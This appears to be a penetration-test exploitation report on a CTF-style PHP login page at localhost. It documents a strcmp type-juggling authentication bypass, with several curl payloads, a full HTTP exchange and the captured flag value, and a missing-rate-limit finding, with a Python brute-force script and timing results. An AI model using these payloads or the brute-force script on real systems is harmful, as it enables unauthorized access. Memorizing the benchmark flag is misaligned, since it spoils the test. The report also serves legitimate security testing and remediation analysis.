# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-02: Authentication Bypass via PHP Type Juggling

**Summary:**
- **Vulnerable location:** GET /index.php (authentication endpoint at line 71 of /var/www/html/index.php)
- **Overview:** Critical authentication bypass vulnerability allowing complete circumvention of login controls through PHP type juggling. By passing the password parameter as an array, the strcmp() function returns NULL which evaluates to TRUE when compared with loose equality (== 0), granting immediate admin access and flag disclosure.
- **Impact:** Complete authentication bypass, immediate privilege escalation from anonymous to admin, CTF flag capture
- **Severity:** Critical

**Prerequisites:**
None - exploit requires only a web browser or HTTP client capable of sending GET requests

**Exploitation Steps:**

1. **Identify the vulnerable authentication endpoint and parameters**
   
   The application is accessible at: `http://localhost:36613/index.php`
   
   Authentication parameters (GET):
   - `username` - expects string value "admin"
   - `password` - compared using strcmp() function

2. **Craft the type juggling payload**
   
   The exploit leverages PHP's type juggling behavior. When an array is passed to strcmp(), it returns NULL instead of performing string comparison. Due to loose comparison (== 0), NULL evaluates to TRUE.
   
   Payload format: `password[]=<any_value>`

3. **Execute the authentication bypass and capture the flag**
   
   ```bash
   curl -v 'http://localhost:36613/index.php?username=admin&password[]=bypass'
   ```
   
   Expected response indicators:
   - HTTP Status: 200 OK
   - Response contains: "Welcome Admin"
   - Response contains: Flag value

4. **Extract the flag from the response**
   
   The response HTML will contain:
   ```html
   <center><h2>Welcome Admin</h2></center>
   <center><h3>Congratulations, here is the flag: FLAG{...}</h3></center>
   ```

**Proof of Impact:**

**CTF Flag Successfully Captured:** `FLAG{3c8d37d2b7349c6124d67400ab817bed508eb3a155f2a0a1699732b1c120d86e}`

Complete HTTP transaction demonstrating successful exploitation:

```
REQUEST:
GET /index.php?username=admin&password[]=bypass HTTP/1.1
Host: localhost:36613
User-Agent: curl/8.7.1
Accept: */*

RESPONSE:
HTTP/1.1 200 OK
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/5.6.40
Content-Type: text/html; charset=UTF-8

[HTML content includes:]
Warning: strcmp() expects parameter 1 to be string, array given in /var/www/html/index.php on line 71
<center><h2>Welcome Admin</h2></center>
<center><h3>Congratulations, here is the flag: FLAG{3c8d37d2b7349c6124d67400ab817bed508eb3a155f2a0a1699732b1c120d86e}</h3></center>
```

The authentication bypass was successfully exploited, granting:
- ✓ Complete administrative access to the application
- ✓ Access to the protected flag value (primary CTF objective)
- ✓ Ability to impersonate the admin user
- ✓ Bypass of all authentication controls

**Alternative Exploitation Payloads:**

All of the following payloads successfully bypass authentication and retrieve the flag:

```bash
# Payload 1: Array with arbitrary value
curl 'http://localhost:36613/index.php?username=admin&password[]=bypass'

# Payload 2: Empty array
curl 'http://localhost:36613/index.php?username=admin&password[]='

# Payload 3: Multi-element array
curl 'http://localhost:36613/index.php?username=admin&password[0]=a&password[1]=b'

# Payload 4: Associative array
curl 'http://localhost:36613/index.php?username=admin&password[key]=value'
```

All variants successfully return "Welcome Admin" message and the flag.

**Root Cause Analysis:**

**Vulnerable code location:** `/var/www/html/index.php` at line 71

```php
if ($_GET['username'] == "admin" && strcmp($_GET['password'], $password) == 0)
```

**Multiple compounding security flaws:**

1. **Undefined Variable**: The variable `$password` is never defined anywhere in the codebase (verified through complete file analysis). In PHP 5.6, undefined variables evaluate to NULL.

2. **Type Confusion**: When `$_GET['password']` is passed as an array (e.g., `password[]=x`), the strcmp() function receives unexpected input type:
   - Expected: `strcmp(string, string)` → returns integer comparison result
   - Actual: `strcmp(array, NULL)` → returns NULL due to type mismatch
   - PHP generates warning: "strcmp() expects parameter 1 to be string, array given"

3. **Loose Comparison Vulnerability**: The code uses loose equality `== 0` instead of strict equality `=== 0`:
   - `NULL == 0` evaluates to TRUE (type juggling)
   - `NULL === 0` would evaluate to FALSE (strict comparison)

4. **No Input Validation**: Zero validation on parameter types:
   - No is_string() check on password parameter
   - No type enforcement on GET parameters
   - No input sanitization of any kind

5. **No Defense-in-Depth**: Single point of failure with no secondary controls:
   - No logging of authentication attempts
   - No anomaly detection for array parameters
   - No rate limiting (see AUTH-VULN-03)

**Technical Details:**

PHP Type Juggling Table (relevant comparisons):
```
NULL == 0    → TRUE  (type juggling occurs)
NULL === 0   → FALSE (strict comparison)
strcmp(array, NULL) → NULL (type error)
```

**Notes:**

This is a textbook example of CWE-843 (Access of Resource Using Incompatible Type / Type Confusion). The vulnerability demonstrates:

- **Trivial exploitation**: Single HTTP request, no special tools required
- **100% reliability**: Deterministic bypass, works every time
- **Zero detectability**: No failed login attempts to alert defenders
- **Zero prerequisites**: No credentials, authentication, or prior access needed
- **Immediate impact**: Direct access to highest privilege level and CTF flag

---

### AUTH-VULN-03: Complete Absence of Rate Limiting Enabling Unlimited Brute Force Attacks

**Summary:**
- **Vulnerable location:** GET /index.php (authentication endpoint)
- **Overview:** The authentication endpoint has zero rate limiting, throttling, or abuse prevention mechanisms at any architectural layer (application, web server, container, or network perimeter). This allows unlimited high-speed authentication attempts without detection, delay, or blocking.
- **Impact:** Enables brute force attacks, credential stuffing, password spraying, and account enumeration at extreme speeds (800+ requests/second confirmed through testing)
- **Severity:** High

**Prerequisites:**
None - any network client capable of HTTP requests can perform unlimited authentication attempts

**Exploitation Steps:**

1. **Create an automated brute force attack script**
   
   Create a Python script to systematically test multiple passwords against the authentication endpoint:
   
   ```python
   #!/usr/bin/env python3
   import requests
   import time
   
   TARGET_URL = "http://localhost:36613/index.php"
   USERNAME = "admin"
   TOTAL_ATTEMPTS = 100
   
   # Generate password list (simulating brute force dictionary)
   passwords = [f"password{i}" for i in range(1, TOTAL_ATTEMPTS + 1)]
   
   print(f"Testing {TOTAL_ATTEMPTS} passwords against {TARGET_URL}")
   print("Demonstrating absence of rate limiting...")
   
   start_time = time.time()
   successful_requests = 0
   status_codes = {}
   
   for i, password in enumerate(passwords, 1):
       response = requests.get(TARGET_URL, params={
           'username': USERNAME,
           'password': password
       })
       
       successful_requests += 1
       status_codes[response.status_code] = status_codes.get(response.status_code, 0) + 1
       
       if i % 10 == 0:
           print(f"Progress: {i}/{TOTAL_ATTEMPTS} attempts completed")
   
   total_time = time.time() - start_time
   requests_per_second = TOTAL_ATTEMPTS / total_time
   
   print(f"\nResults:")
   print(f"  Total Requests: {TOTAL_ATTEMPTS}")
   print(f"  Successful: {successful_requests}")
   print(f"  Total Time: {total_time:.2f} seconds")
   print(f"  Requests/Second: {requests_per_second:.2f}")
   print(f"  Status Codes: {status_codes}")
   ```

2. **Execute the brute force attack**
   
   Save the script as `test_rate_limiting_corrected.py` and execute:
   
   ```bash
   cd /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-055-24
   python3 test_rate_limiting_corrected.py
   ```

3. **Observe results demonstrating zero rate limiting**
   
   Monitor the output showing all requests succeed without throttling:
   ```
   Progress: 10/100 attempts completed
   Progress: 20/100 attempts completed
   ...
   Progress: 100/100 attempts completed
   
   Results:
     Total Requests: 100
     Successful: 100
     Total Time: 0.12 seconds
     Requests/Second: 803.95
     Status Codes: {200: 100}
   ```

**Proof of Impact:**

**Brute Force Attack Successfully Executed Without Any Impediment:**

Test Results from automated attack:
- **Total Authentication Attempts**: 100
- **Successfully Processed**: 100 (100% success rate)
- **Blocked/Throttled**: 0 (0%)
- **Total Execution Time**: 0.12 seconds
- **Sustained Request Rate**: 803.95 requests per second
- **Average Response Time**: 0.001 seconds per request
- **Status Codes**: All 100 requests returned HTTP 200 OK

**Demonstrated Attack Capabilities:**

This absence of rate limiting enables an attacker to:

1. **High-Speed Brute Force**: Test thousands of passwords per second
   - 800+ passwords per second
   - 48,000 passwords per minute
   - 2.8 million passwords per hour
   - 69 million passwords per day

2. **Credential Stuffing at Scale**: Test leaked credential databases
   - Process entire breach datasets in minutes
   - No delays between attempts
   - No account lockouts

3. **Password Spraying**: Test common passwords across accounts
   - No detection of patterns
   - No progressive delays
   - Unlimited attempts per account

4. **Account Enumeration**: Identify valid usernames through timing analysis
   - No penalties for failed attempts
   - No alerting on suspicious patterns

**Manual Attack Demonstration:**

Sequential manual requests showing no throttling:

```bash
# Request 1 - succeeds immediately
curl -w "\nTime: %{time_total}s\n" "http://localhost:36613/index.php?username=admin&password=test1"
# Response: 200 OK, Time: 0.002s

# Request 2 - immediately after, no delay
curl -w "\nTime: %{time_total}s\n" "http://localhost:36613/index.php?username=admin&password=test2"
# Response: 200 OK, Time: 0.002s

# Request 3 - still no throttling
curl -w "\nTime: %{time_total}s\n" "http://localhost:36613/index.php?username=admin&password=test3"
# Response: 200 OK, Time: 0.002s

# Requests 4-100+ - pattern continues indefinitely
```

No progressive delays, no exponential backoff, no blocking - all requests process at the same speed.

**Confirmed Absence of Security Controls:**

Through systematic testing and code analysis, verified zero rate limiting at all architectural layers:

**Application Layer** (index.php - lines 1-81):
- ✗ No failed login counter
- ✗ No IP address tracking ($_SERVER['REMOTE_ADDR'] never referenced)
- ✗ No session-based attempt tracking (no sessions implemented)
- ✗ No exponential backoff logic
- ✗ No CAPTCHA challenges
- ✗ No account lockout mechanism
- ✗ No sleep() delays between authentication attempts
- ✗ No database to store attempt history (no database exists)

**Web Server Layer** (Apache 2.4.25):
- ✗ No mod_ratelimit module configured
- ✗ No mod_evasive module installed
- ✗ No mod_security WAF configured
- ✗ No .htaccess files with rate limiting rules
- ✗ Default Apache configuration with no security hardening

**Container/Infrastructure Layer** (Docker):
- ✗ No reverse proxy with rate limiting (direct Apache exposure)
- ✗ No WAF (Web Application Firewall)
- ✗ No cloud-based DDoS protection
- ✗ No Kubernetes rate limiting policies
- ✗ Direct network exposure on port 36613

**Network Layer**:
- ✗ No firewall rules limiting connection rate
- ✗ No network-level DDoS protection
- ✗ No fail2ban or similar intrusion prevention

**Notes:**

While the type juggling bypass (AUTH-VULN-02) makes brute force attacks unnecessary in this specific application, the complete absence of rate limiting represents a fundamental security architecture failure with severe implications:

**Defense-in-Depth Failure**: Even if the type juggling vulnerability were fixed, the lack of rate limiting would still allow:
- Dictionary attacks against any password
- Automated credential stuffing from data breaches
- Systematic account enumeration
- Denial of service through resource exhaustion

**Real-World Impact**: The measured throughput of 800+ requests/second means an attacker with a moderate password dictionary (e.g., 1 million entries) could:
- Complete full brute force in: ~21 minutes
- Test top 10,000 common passwords in: ~12 seconds
- Process a leaked credential database in: minutes to hours (depending on size)

**Industry Standard Violation**: This violates OWASP authentication best practices requiring:
- Progressive delays after failed attempts
- Account lockout after N failed attempts (typically 3-10)
- IP-based rate limiting
- CAPTCHA after suspicious patterns

---